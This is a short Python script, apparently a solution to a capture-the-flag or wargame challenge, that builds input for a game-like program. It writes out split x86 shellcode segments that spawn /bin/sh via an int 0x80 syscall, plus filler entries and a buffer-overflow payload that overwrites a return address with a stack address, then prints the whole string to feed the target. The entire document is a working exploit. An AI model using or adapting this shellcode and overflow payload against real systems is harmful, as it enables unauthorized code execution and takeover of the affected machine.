monsters = "c" + "\nc" * 9 + "\no" # create monsters to fight
seg1 = "\n\xB8\xF5\xFF\xFF\xFF\xF7\xD8\x31\xD2\xEB\x0D" # first segment of shellcode, jmp to next segment.
seg2 = "\n\xBB\xDA\xD5\xFF\xFF\x52\x53\x89\xE1\xCD\x80" # second segment of shellcode
bin = "\n/bin/sh" # shell
blanks = "\nh" * 7 # blank names
bof = "\naaaa\xaa\xd5\xff\xffxxxx" # bof exploit to overwrite return address
print(monsters + seg1 + seg2 + bin + blanks + bof + "\na"*38) # print and exploit!
